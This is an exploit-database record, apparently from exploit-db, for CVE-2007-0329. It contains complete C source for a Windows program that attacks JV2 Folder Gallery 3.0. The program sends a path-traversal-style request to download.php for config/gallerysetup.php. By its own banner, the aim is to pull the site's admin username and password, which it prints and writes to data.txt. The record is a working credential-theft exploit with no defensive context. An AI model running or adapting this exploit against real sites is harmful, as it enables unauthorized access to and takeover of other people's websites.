{
  "id": "3125",
  "title": "JV2 Folder Gallery 3.0 - &#039;download.php&#039; Remote File Disclosure",
  "cve": "CVE-2007-0329",
  "vuln_type": "unknown",
  "code": "/*\r\nScript Name  :JV2 Folder Gallery\r\nScript site  :www.jv2.net\r\n\r\nDiscovered by    :SaO \r\nExploit Coded by :PeTrO \r\nCredits To soulreaver,Kuz3y\r\n\r\nCompile: Visual C++ or DevC++ \r\n         \r\n\r\n*/\r\n\r\n#include <stdio.h>\r\n#include <string.h>\r\n#include <winsock.h>\r\n#pragma comment(lib,\"ws2_32.lib\")\r\n\r\nint main(int argc, char *argv[])\r\n{\r\n\r\nchar gelenveri[1000];\r\nchar sendCommand[1000];\r\nint i=0,sayac=0;\r\n\r\nWSADATA wsdata;\r\nSOCKET s;\r\nstruct hostent *hn;\r\nstruct sockaddr_in karsi_addr;\r\nWSAStartup(MAKEWORD(2,0),&wsdata);\r\n\r\n\r\n\r\nif(argc!=3)\r\n{ \r\n     printf(\"\\t**************************************************************\\n\"\r\n            \"\\t*                                                            *\\n\"\r\n            \"\\t*                   JV2 Folder Gallery                       *\\n\"                         \r\n            \"\\t*        Remote Admin uName and Pass. Exploit by PeTrO       *\\n\"\r\n            \"\\t*                                                            *\\n\"\r\n            \"\\t*    Usage:exploit targetSite [GalleryPath]                  *\\n\"\r\n            \"\\t*    Example:exploit localhost /gallery/                     *\\n\"\r\n            \"\\t*                                                            *\\n\"\r\n            \"\\t*    Discovered by    :SaO                                   *\\n\"\r\n            \"\\t*    Exploit Coded by :PeTrO                                 *\\n\"\r\n            \"\\t**************************************************************\\n\");\r\n     \r\n     exit(1);\r\n}else{\r\n      hn=gethostbyname(argv[1]);\r\n     }\r\n\r\nstrcpy(sendCommand,\"GET \");\r\nstrcat(sendCommand,argv[2]);\r\nstrcat(sendCommand,\"download.php?file=config/gallerysetup.php \\n\\n\");\r\n\r\n\r\nprintf(\"\\n[+]Connecting....\");\r\nkarsi_addr.sin_family = AF_INET;\r\nkarsi_addr.sin_port = htons(80);\r\nkarsi_addr.sin_addr =*((struct in_addr *)hn->h_addr);\r\nmemset(&(karsi_addr.sin_zero),'\\0', 8);\r\nif((s=socket(AF_INET, SOCK_STREAM, 0))==-1 ) //create a socket\r\n{\r\n    printf(\"\\n[-]Socket Error\");\r\n    exit(-1);\r\n}\r\n\r\nif((connect(s,(struct sockaddr *)&karsi_addr,sizeof(struct sockaddr)))==-1)//connect server\r\n{\r\n    printf(\"\\n[-]Connecting Error\");\r\n    exit(-1);\r\n}\r\n\r\nprintf(\"\\n[+]Sending command\\n\");\r\nif((send(s,sendCommand,strlen(sendCommand),0))==-1)\r\n{\r\n    printf(\"\\n[-]Sending Error\");\r\n    exit(-1);\r\n}\r\n\r\nif((recv(s,gelenveri,1000,0))==-1)\r\n{\r\n     printf(\"\\n[-]Receive Error\");\r\n     exit(-1);\r\n}\r\n\r\nFILE *fp;\r\n\r\nfp=fopen(\"data.txt\",\"w\");\r\n\r\nfor(i=0;sayac!=2;i++)\r\n{\r\n   if(gelenveri[i]==59) sayac++;\r\n   \r\n   printf(\"%c\",gelenveri[i]);\r\n}   \r\n   \r\nfprintf(fp,\"%s\",gelenveri);\r\n   \r\nWSACleanup();\r\nreturn 0;\r\n}\r\n\r\n// milw0rm.com [2007-01-14]",
  "url": "https://www.exploit-db.com/exploits/3125"
}